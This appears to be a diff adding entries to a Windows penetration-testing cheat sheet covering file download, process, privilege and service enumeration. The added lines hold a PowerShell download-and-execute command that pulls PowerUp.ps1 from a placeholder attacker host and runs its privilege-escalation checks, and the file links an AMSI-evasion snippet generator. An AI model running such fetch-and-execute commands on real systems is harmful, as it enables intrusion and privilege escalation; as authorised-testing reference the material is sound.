@@ -5,6 +5,12 @@
 powershell -c wget "http://<Source Address>/<Source File>" -outfile "<Output File>"
 ```
 
+##### Download A File To String and Invoke
+```bash
+PS > iex (New-Object Net.WebClient).DownloadString('http://[Attack Host]/PowerUp.ps1')
+PS > Invoke-AllChecks
+```
+
 ##### Get list of processes running, sorted by name.
 ```powershell
 tasklist /NH | sort
@@ -19,6 +25,8 @@ whoami /priv
 ```powershell
 powershell Get-Service
 ```
+
+# [From Meterpreter](../../../Metasploit/README.MD#PowerShell)
 
 # References
 ##### [Generates obfuscated PowerShell snippets](https://amsi.fail/)
